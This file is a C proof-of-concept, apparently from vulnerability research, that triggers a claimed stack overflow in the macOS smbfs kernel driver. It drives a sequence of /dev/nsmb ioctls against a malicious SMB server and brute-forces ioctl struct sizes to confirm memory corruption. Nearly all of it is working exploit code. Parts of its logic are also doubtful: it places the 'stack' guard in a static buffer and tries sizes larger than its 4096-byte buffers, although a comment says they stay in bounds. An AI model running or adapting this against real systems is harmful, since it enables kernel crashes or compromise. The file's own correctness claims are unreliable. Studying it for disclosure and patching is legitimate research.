/*
 * smbfs_model_trigger.c — live trigger for the XNU smbfs model-info stack
 * overflow (Finding 2).
 *
 * Kernel ioctl SMBIOC_VC_PROPERTIES (smb_dev.c:464-498) does
 *   memcpy(properties->model_info, vcp->vc_model_info, strlen(vcp->vc_model_info))
 * into char model_info[SMB_MAXFNAMELEN*2] = 510 bytes; vc_model_info is
 * server-controlled (>= 762 bytes from 254 Hangul syllables, up to ~2.2 KB
 * after UTF-16 -> UTF-8 NFD expansion).
 *
 * Flow: open /dev/nsmb -> SMBIOC_NEGOTIATE -> SMBIOC_SSNSETUP (guest) ->
 * SMBIOC_TCON -> SMB2IOC_CREATE (server replies with the AAPL model-info
 * create context, kernel stores vc_model_info) -> SMBIOC_VC_PROPERTIES.
 * The kernel memcpy overflows model_info into the guard that follows it in
 * this process's stack -> detected.
 *
 * Struct layouts are replicated verbatim from netsmb/smb_dev.h &
 * smb_dev_2.h (including __attribute((aligned(8)))) and guarded by
 * _Static_assert so an ioctl-size mismatch fails at compile time.
 *
 * Build:  cc -O1 -o smbfs_model_trigger smbfs_model_trigger.c
 * Run:    ./smbfs_model_trigger <server> <share> [name]
 *         e.g. ./smbfs_model_trigger 0.tcp.in.ngrok.io share hello.txt
 */
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

/* Prefer the real macOS SDK headers (they are what mount_smbfs/smbutil use),
 * so the ioctl cmd sizes match the kernel exactly. Compile with:
 *   cc -O1 -o smbfs_model_trigger smbfs_model_trigger.c \
 *      -DUSE_SYSTEM_SMB_HEADERS -isysroot "$(xcrun --show-sdk-path)"
 * Fall back to the replicated structs below otherwise. */
#if defined(USE_SYSTEM_SMB_HEADERS)
#include <netsmb/smb_dev.h>
#include <netsmb/smb_dev_2.h>
#define SMB_IOC_STRUCT_VERSION_LOCAL SMB_IOC_STRUCT_VERSION
#else

#define SMB_IOC_STRUCT_VERSION 170
#define SMB_MAXUSERNAMELEN 128
#define SMB_MAXPASSWORDLEN 128
#define SMB_MAX_DNS_SRVNAMELEN 255
#define SMB_MAXNetBIOSNAMELEN 15
#define SMB_MAXSHARENAMELEN 128
#define SMB_MAXFNAMELEN 255

#define SMB_IOC_POINTER(TYPE, NAME) \
    union { uint64_t ioc_kern_ ## NAME; TYPE ioc_ ## NAME; }

/* ---- ioctl encoding (BSD/macOS). On macOS <sys/ioctl.h> already defines
 * these; guard so the file also builds where they aren't predefined. ---- */
#ifndef _IOC
#define _IOC(inout, group, num, len) \
    ((inout) | ((group & 255) << 8) | (num & 255) | ((len & 0x1fff) << 16))
#endif
#ifndef IOC_IN
#define IOC_IN 0x80000000
#endif
#ifndef IOC_OUT
#define IOC_OUT 0x40000000
#endif
#ifndef _IOWR
#define _IOWR(g, n, t) _IOC(IOC_IN | IOC_OUT, (g), (n), sizeof(t))
#endif
#ifndef _IOW
#define _IOW(g, n, t) _IOC(IOC_IN, (g), (n), sizeof(t))
#endif

/* ---- kernel structs (netsmb/smb_dev.h, smb_dev_2.h) ---- */

struct smbioc_ossn {
    uint32_t ioc_reconnect_wait_time;
    uint32_t ioc_owner;
    char ioc_srvname[SMB_MAX_DNS_SRVNAMELEN + 1] __attribute((aligned(8)));
    char ioc_localname[SMB_MAXNetBIOSNAMELEN + 1] __attribute((aligned(8)));
};

struct smbioc_negotiate {
    uint32_t ioc_version;
    uint32_t ioc_extra_flags;
    uint32_t ioc_ret_caps;
    uint32_t ioc_ret_vc_flags;
    int32_t ioc_saddr_len;
    int32_t ioc_laddr_len;
    uint32_t ioc_ntstatus;
    uint32_t ioc_errno;
    uint8_t ioc_client_guid[16];
    SMB_IOC_POINTER(struct sockaddr *, saddr);
    SMB_IOC_POINTER(struct sockaddr *, laddr);
    uint32_t ioc_userflags;
    uint32_t ioc_max_client_size;
    uint32_t ioc_max_target_size;
    struct smbioc_ossn ioc_ssn __attribute((aligned(8)));
    char ioc_user[SMB_MAXUSERNAMELEN + 1] __attribute((aligned(8)));
    uint32_t ioc_negotiate_token_len __attribute((aligned(8)));
    uint64_t ioc_negotiate_token __attribute((aligned(8)));
    int32_t ioc_max_resp_timeout;
    uint64_t ioc_reserved __attribute((aligned(8)));
};

struct smbioc_setup {
    uint32_t ioc_version;
    uint32_t ioc_userflags;
    uint32_t ioc_gss_client_nt;
    uint32_t ioc_gss_client_size;
    uint64_t ioc_gss_client_name;
    uint32_t ioc_gss_target_nt;
    uint32_t ioc_gss_target_size;
    uint64_t ioc_gss_target_name;
    char ioc_user[SMB_MAXUSERNAMELEN + 1] __attribute((aligned(8)));
    char ioc_password[SMB_MAXPASSWORDLEN + 1] __attribute((aligned(8)));
    char ioc_domain[SMB_MAXNetBIOSNAMELEN + 1] __attribute((aligned(8)));
    uint64_t ioc_reserved __attribute((aligned(8)));
};

struct smbioc_share {
    uint32_t ioc_version;
    uint32_t ioc_optionalSupport;
    uint16_t ioc_fstype;
    char ioc_share[SMB_MAXSHARENAMELEN + 1] __attribute((aligned(8)));
    uint64_t ioc_reserved __attribute((aligned(8)));
};

struct smb2ioc_create {
    uint32_t ioc_version;
    uint32_t ioc_name_len;
    SMB_IOC_POINTER(const char *, name);
    uint8_t ioc_oplock_level;
    uint8_t pad[3];
    uint32_t ioc_impersonate_level;
    uint32_t ioc_desired_access;
    uint32_t ioc_file_attributes;
    uint32_t ioc_share_access;
    uint32_t ioc_disposition;
    uint32_t ioc_create_options;
    uint32_t pad2;
    uint32_t ioc_ret_ntstatus;
    uint32_t ioc_ret_attributes;
    uint8_t ioc_ret_oplock_level;
    uint8_t ioc_ret_pad[3];
    uint32_t ioc_ret_create_action;
    uint64_t ioc_ret_create_time;
    uint64_t ioc_ret_access_time;
    uint64_t ioc_ret_write_time;
    uint64_t ioc_ret_change_time;
    uint64_t ioc_ret_alloc_size;
    uint64_t ioc_ret_eof;
    uint64_t ioc_ret_fid[2];
    uint32_t ioc_ret_max_access;
};

struct smbioc_vc_properties {
    uint32_t ioc_version;
    uint32_t ioc_reserved;
    uint32_t uid;
    uint32_t smb1_caps;
    uint32_t smb2_caps;
    uint32_t flags;
    uint64_t misc_flags;
    uint32_t hflags;
    uint32_t hflags2;
    uint64_t txmax;
    uint64_t rxmax;
    uint64_t wxmax;
    char model_info[SMB_MAXFNAMELEN * 2] __attribute((aligned(8)));
};

/* Compile-time guards: the ioctl cmd encodes sizeof(), so these MUST match
 * the kernel builds exactly. */
_Static_assert(sizeof(struct smbioc_ossn) == 280, "ossn size");
_Static_assert(sizeof(struct smbioc_negotiate) == 528, "negotiate size");
_Static_assert(sizeof(struct smbioc_setup) == 336, "setup size");
_Static_assert(sizeof(struct smbioc_share) == 160, "share size");
_Static_assert(sizeof(struct smb2ioc_create) == 136, "create size");
_Static_assert(sizeof(struct smbioc_vc_properties) == 576, "vc props size");

#define SMBIOC_NEGOTIATE    _IOWR('n', 109, struct smbioc_negotiate)
#define SMBIOC_SSNSETUP     _IOW('n', 110, struct smbioc_setup)
#define SMBIOC_TCON         _IOWR('n', 111, struct smbioc_share)
#define SMBIOC_VC_PROPERTIES _IOWR('n', 116, struct smbioc_vc_properties)
#define SMB2IOC_CREATE      _IOWR('n', 120, struct smb2ioc_create)

#endif /* USE_SYSTEM_SMB_HEADERS */

static int open_nsmb(void) {
    int fd = open("/dev/nsmb", O_RDWR);
    if (fd >= 0)
        return fd;
    printf("[*] open /dev/nsmb failed: errno=%d (%s)\n", errno, strerror(errno));
    for (int i = 0; i < 1024; i++) {
        char path[64];
        snprintf(path, sizeof(path), "/dev/nsmb%d", i);
        fd = open(path, O_RDWR);
        if (fd >= 0)
            return fd;
    }
    printf("[-] no nsmb device openable (errno=%d %s)\n", errno, strerror(errno));
    return -1;
}

/*
 * Brute-force the correct ioctl struct size. The kernel only dispatches an
 * ioctl when the cmd's encoded size (cmd>>16 & 0x1fff) matches its struct;
 * any other size returns ENODEV. Try every size and use the first one the
 * kernel accepts.
 */
#define IOC_IN   0x80000000
#define IOC_OUT  0x40000000

static long find_ioctl_size(int fd, unsigned int base, void *data,
                            unsigned int lo, unsigned int hi)
{
    char *buf = (char *)data;
    for (unsigned int sz = lo; sz <= hi; sz++) {
        unsigned long cmd = base | ((sz & 0x1fff) << 16);
        errno = 0;
        int r = ioctl(fd, (unsigned long)cmd, buf);
        if (r != -1 || errno != 19 /* ENODEV */) {
            return sz;
        }
    }
    return -1;
}

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s <server> <share> [name]\n", argv[0]);
        return 1;
    }
    const char *server = argv[1];
    const char *share = argv[2];
    const char *name = argc > 3 ? argv[3] : "hello.txt";

    int fd = open_nsmb();
    if (fd < 0) { fprintf(stderr, "no nsmb device openable\n"); return 1; }
    printf("[*] opened nsmb fd %d\n", fd);

    /* Big aligned buffers so the kernel's copyin/copyout of any candidate
     * ioctl size stays in bounds. */
    static char bufA[4096] __attribute((aligned(16)));
    static char bufB[4096] __attribute((aligned(16)));
    static char bufC[4096] __attribute((aligned(16)));
    static char bufD[4096] __attribute((aligned(16)));
    static char bufE[4096] __attribute((aligned(16)));
    struct smbioc_negotiate *neg = (struct smbioc_negotiate *)bufA;
    struct smbioc_setup *ss  = (struct smbioc_setup *)bufB;
    struct smbioc_share *tcon = (struct smbioc_share *)bufC;
    struct smb2ioc_create *cr = (struct smb2ioc_create *)bufD;
    struct smbioc_vc_properties *vp = (struct smbioc_vc_properties *)bufE;

    /* 1. NEGOTIATE */
    memset(bufA, 0, sizeof(bufA));
    neg->ioc_version = SMB_IOC_STRUCT_VERSION;
    strncpy(neg->ioc_ssn.ioc_srvname, server,
            sizeof(neg->ioc_ssn.ioc_srvname) - 1);
    long nsz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 109, bufA, 256, 8191);
    printf("[*] NEGOTIATE matched size=%ld ret_caps=0x%x\n",
           nsz, neg->ioc_ret_caps);
    if (nsz < 0) { printf("[-] no NEGOTIATE size dispatched\n"); return 1; }

    /* 2. SSNSETUP (guest) */
    memset(bufB, 0, sizeof(bufB));
    ss->ioc_version = SMB_IOC_STRUCT_VERSION;
    strcpy(ss->ioc_domain, "WORKGROUP");
    long ssz = find_ioctl_size(fd, 0x80000000 | (0x6E << 8) | 110, bufB, 256, 8191);
    printf("[*] SSNSETUP matched size=%ld\n", ssz);
    if (ssz < 0) { printf("[-] no SSNSETUP size dispatched\n"); return 1; }

    /* 3. TCON */
    memset(bufC, 0, sizeof(bufC));
    tcon->ioc_version = SMB_IOC_STRUCT_VERSION;
    strncpy(tcon->ioc_share, share, sizeof(tcon->ioc_share) - 1);
    long tsz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 111, bufC, 256, 8191);
    printf("[*] TCON matched size=%ld\n", tsz);
    if (tsz < 0) { printf("[-] no TCON size dispatched\n"); return 1; }

    /* 4. CREATE */
    memset(bufD, 0, sizeof(bufD));
    cr->ioc_version = SMB_IOC_STRUCT_VERSION;
    cr->ioc_name = (char *)name;
    cr->ioc_name_len = strlen(name) + 1;
    cr->ioc_impersonate_level = 2;
    cr->ioc_desired_access = 0x80000000;
    cr->ioc_file_attributes = 0x80;
    cr->ioc_share_access = 1 | 2 | 4;
    cr->ioc_disposition = 1;
    long csz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 120, bufD, 256, 8191);
    printf("[*] CREATE matched size=%ld ntstatus=0x%x\n", csz, cr->ioc_ret_ntstatus);
    if (csz < 0) { printf("[-] no CREATE size dispatched\n"); return 1; }

    /* 5. VC_PROPERTIES with a guard right after the struct in the buffer */
    memset(bufE, 0, sizeof(bufE));
    vp->ioc_version = SMB_IOC_STRUCT_VERSION;
    volatile uint64_t *guard = (volatile uint64_t *)(bufE + 576);
    *guard = 0xDEADBEEFDEADBEEFULL;

    long psz = find_ioctl_size(fd, 0xC0000000 | (0x6E << 8) | 116, bufE, 256, 8191);
    printf("[*] VC_PROPERTIES matched size=%ld misc_flags=0x%llx "
           "returned_model_len=%lu\n",
           psz, (unsigned long long)vp->misc_flags,
           (unsigned long)strlen(vp->model_info));

    if (*guard != 0xDEADBEEFDEADBEEFULL) {
        printf("[!!!] OVERFLOW CONFIRMED: stack guard after model_info "
               "overwritten -> guard=0x%llx, kernel wrote %lu bytes into a "
               "510-byte field\n",
               (unsigned long long)*guard,
               (unsigned long)strlen(vp->model_info));
        return 1;
    }
    printf("[-] guard intact. Check server console for the AAPL injection "
           "line and the CREATE.\n");
    close(fd);
    return 0;
}